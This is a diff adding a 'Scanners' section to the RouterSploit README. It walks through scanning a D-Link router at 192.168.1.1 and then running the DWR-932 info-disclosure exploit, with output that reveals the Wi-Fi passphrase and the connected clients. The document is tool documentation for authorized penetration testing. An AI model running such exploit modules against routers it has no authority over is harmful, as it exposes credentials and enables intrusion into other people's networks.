@@ -186,7 +186,67 @@ Set target:
 
     rsf (SSH Default Creds) > 
 	
+## 3. Scanners
 
+Scanners allow quickly verify if the target is vulnerable to any exploits.
+
+### Pick module
+
+    rsf > use scanners/dlink_scan
+    rsf (D-Link Scanner) > show options
+
+
+### Options
+
+    Target options:
+    
+       Name       Current settings     Description                                
+       ----       ----------------     -----------                                
+       target                          Target address e.g. http://192.168.1.1     
+       port       80                   Target port                                
+
+Set target:
+
+    rsf (D-Link Scanner) > set target 192.168.1.1
+    [+] {'target': '192.168.1.1'}
+
+### Run module
+
+    rsf (D-Link Scanner) > run
+    [+] exploits/dlink/dwr_932_info_disclosure is vulnerable
+    [-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
+    [-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
+    [-] exploits/dlink/dns_320l_327l_rce is not vulnerable
+    [-] exploits/dlink/dir_645_password_disclosure is not vulnerable
+    [-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
+    [-] exploits/dlink/dir_300_600_rce is not vulnerable
+    
+    [+] Device is vulnerable!
+     - exploits/dlink/dwr_932_info_disclosure
+
+It has been verified that target is vulnerable to dwr\_932\_info\_disclosure exploit. Now use proper module and exploit target.
+
+    rsf (D-Link Scanner) > use exploits/dlink/dwr_932_info_disclosure
+    rsf (D-Link DWR-932 Info Disclosure) > set target 192.168.1.1
+    [+] {'target': '192.168.1.1'}
+    rsf (D-Link DWR-932 Info Disclosure) > exploit
+    [*] Running module...
+    [*] Decoding JSON value
+    [+] Exploit success
+    
+       Parameter                  Value                                                                                                 
+       ---------                  -----                                                                                                 
+       get_wps_enable             0                                                                                                     
+       wifi_AP1_enable            1                                                                                                     
+       get_client_list            9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0     
+       wifi_AP1_ssid              dlink-DWR-932                                                                                         
+       get_mac_address            c4:00:f5:00:ec:40                                                                                     
+       wifi_AP1_security_mode     3208,8                                                                                                
+       wifi_AP1_hidden            0                                                                                                     
+       get_mac_filter_switch      0                                                                                                     
+       wifi_AP1_passphrase        MyPaSsPhRaSe                                                                                          
+       get_wps_mode               0
+    
 # License
 
 License has been taken from BSD licensing and applied to RouterSploit Framework.
